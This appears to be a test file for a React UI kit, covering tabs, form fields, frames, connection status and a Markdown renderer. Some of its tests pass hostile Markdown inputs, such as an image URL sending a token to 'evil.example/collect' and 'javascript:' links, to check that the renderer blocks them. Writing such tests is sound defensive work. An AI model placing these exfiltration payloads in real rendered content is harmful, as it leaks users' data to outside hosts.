/** @jsxRuntime classic */
/** @jsx React.createElement */
// deno-lint-ignore verbatim-module-syntax -- classic JSX requires this runtime import.
import * as React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { test } from "node:test";
import assert from "node:assert/strict";
import type { BrowserViewContext } from "@copilotz/copilotz/web";
import {
  Button,
  Checkbox,
  ConfirmAction,
  ConnectionStatus,
  CopyField,
  Dialog,
  DropdownMenu,
  DropdownMenuTrigger,
  EmptyState,
  Field,
  Frame,
  Input,
  isReconnecting,
  Markdown,
  NativeSelect,
  Notice,
  PaneBoundary,
  ReadStatus,
  showSafely,
  Tabs,
  TabsContent,
  TabsList,
  TabsTrigger,
} from "../index.ts";

test("shared kit renders tabs, forms, feedback and menu/confirmation triggers", () => {
  const html = renderToStaticMarkup(
    <div>
      <Tabs defaultValue="one">
        <TabsList>
          <TabsTrigger value="one">First</TabsTrigger>
          <TabsTrigger value="two">Second</TabsTrigger>
        </TabsList>
        <TabsContent value="one">Active content</TabsContent>
      </Tabs>
      <Field label="Name" hint="Public name">{(id) => <Input id={id} />}</Field>
      <NativeSelect aria-label="Role" defaultValue="reader">
        <option value="reader">Reader</option>
      </NativeSelect>
      <Checkbox label="Enabled" defaultChecked />
      <Notice tone="error" title="Unavailable">Try again</Notice>
      <EmptyState title="No records" action={<Button>Create</Button>}>
        Create a record to begin.
      </EmptyState>
      <CopyField label="Token" value="example" copy={() => Promise.resolve()} />
      <DropdownMenu>
        <DropdownMenuTrigger>Options</DropdownMenuTrigger>
      </DropdownMenu>
      <ConfirmAction
        trigger={<Button>Remove</Button>}
        title="Remove record?"
        onConfirm={() => true}
      />
      <PaneBoundary label="Preview">Safe content</PaneBoundary>
    </div>,
  );
  for (
    const expected of [
      'role="tablist"',
      'aria-selected="true"',
      "Active content",
      'data-slot="native-select"',
      'type="checkbox"',
      'role="alert"',
      "No records",
      "Token",
      "Options",
      "Remove",
      "Safe content",
    ]
  ) assert.ok(html.includes(expected), expected);
  const id = html.match(/<label[^>]*for="([^"]+)"/)?.[1];
  assert.ok(
    id && html.includes(`id="${id}"`),
    "field label connects to control",
  );
});

test("Frame keeps title, description and actions in full, panel and dialog densities", () => {
  for (const mode of ["full", "panel", "dialog"]) {
    const ctx = { hints: { mode } } as BrowserViewContext;
    const html = renderToStaticMarkup(
      <Dialog>
        <Frame
          ctx={ctx}
          title="Record"
          description="Details"
          actions={<Button>Edit</Button>}
        >
          Body
        </Frame>
      </Dialog>,
    );
    for (
      const text of [
        `data-density="${mode}"`,
        "Record",
        "Details",
        "Edit",
        "Body",
      ]
    ) assert.ok(html.includes(text), html);
  }
});

test("pane resolution errors become local notices", () => {
  const ctx = {
    show() {
      throw new Error("View not found");
    },
  } as unknown as BrowserViewContext;
  const html = renderToStaticMarkup(
    showSafely(ctx, { shows: "missing", value: null }, {}, "Context"),
  );
  assert.ok(html.includes("Context is unavailable"));
  assert.ok(html.includes("View not found"));
});

const markdown = (source: string, imageOrigins?: readonly string[]) =>
  renderToStaticMarkup(
    <Markdown imageOrigins={imageOrigins}>{source}</Markdown>,
  );
const images = (html: string) =>
  [...html.matchAll(/<img [^>]*src="([^"]*)"/g)].map((match) => match[1]);

// The URL policy itself is tested in client/web/markdown.test.ts.
test("Markdown renders a refused image as its alt text, never as an img", () => {
  for (
    const source of [
      "![secret](https://evil.example/collect?q=token)",
      "![ref][pixel]\n\n[pixel]: //evil.example/ref.png",
      "![x](javascript:alert%281%29)",
    ]
  ) {
    const html = markdown(source, ["https://cdn.example"]);
    assert.deepEqual(images(html), [], html);
    assert.doesNotMatch(html, /evil\.example|javascript:/, html);
    assert.match(html, /data-slot="blocked-image"/);
  }
  assert.match(markdown("![Chart](https://evil.example/a.png)"), />Chart</);
  assert.match(markdown("![](https://evil.example/a.png)"), /Image not loaded/);
});

test("Markdown loads relative, same-origin and allowlisted images", () => {
  assert.deepEqual(images(markdown("![a](/files/a.png)")), ["/files/a.png"]);
  const page = Object.getOwnPropertyDescriptor(globalThis, "location");
  Object.defineProperty(globalThis, "location", {
    value: new URL("https://app.example/chat?thread=t"),
    configurable: true,
  });
  try {
    const source =
      "![a](https://app.example/a.png) ![b](https://cdn.example/b.png)";
    assert.deepEqual(images(markdown(source)), [
      "https://app.example/a.png",
    ]);
    assert.deepEqual(images(markdown(source, ["https://cdn.example"])), [
      "https://app.example/a.png",
      "https://cdn.example/b.png",
    ]);
  } finally {
    if (page) Object.defineProperty(globalThis, "location", page);
    else delete (globalThis as { location?: unknown }).location;
  }
});

test("Markdown links stay clickable, open a new tab and send no referrer", () => {
  const html = markdown(
    "[site](https://example.com/a) and https://example.com/auto and [x](javascript:alert%281%29)",
  );
  const links = [...html.matchAll(/<a [^>]*>/g)].map((match) => match[0]);
  assert.equal(links.length, 3, html);
  for (const link of links) {
    assert.match(link, /target="_blank"/);
    assert.match(link, /rel="noopener noreferrer nofollow"/);
  }
  assert.match(html, /href="https:\/\/example.com\/a"/);
  assert.match(html, /href="https:\/\/example.com\/auto"/);
  assert.doesNotMatch(html, /javascript:/);
});

test("a held read offers a Load button only when it can be refreshed", () => {
  const held = { value: undefined, status: "held", pending: false } as const;
  const html = renderToStaticMarkup(
    <ReadStatus state={{ ...held, refresh() {} }} />,
  );
  assert.match(html, /Opened from a link/);
  assert.match(html, />Load</);
  assert.doesNotMatch(
    renderToStaticMarkup(<ReadStatus state={held} />),
    /Load</,
  );
});

test("reconnecting is quiet at first and never hides a refusal", () => {
  const stale = { value: [], status: "stale", pending: false } as const;
  const away = {
    kind: "unavailable",
    code: "socket_closed",
    message: "Connection lost.",
    retryable: true,
  } as const;
  assert.equal(isReconnecting(stale), true);
  assert.equal(
    isReconnecting({ ...stale, error: away }),
    true,
  );
  assert.equal(
    isReconnecting({
      ...stale,
      error: { ...away, reason: "quota_exceeded" },
    }),
    false,
    "a refused read says why instead",
  );
  // The indicator waits before it shows, so a brief reconnect never flashes;
  // a stale read in quiet mode leaves it to that one indicator.
  assert.equal(renderToStaticMarkup(<ConnectionStatus reconnecting />), "");
  assert.equal(
    renderToStaticMarkup(<ReadStatus state={stale} transient="quiet" />),
    "",
  );
});
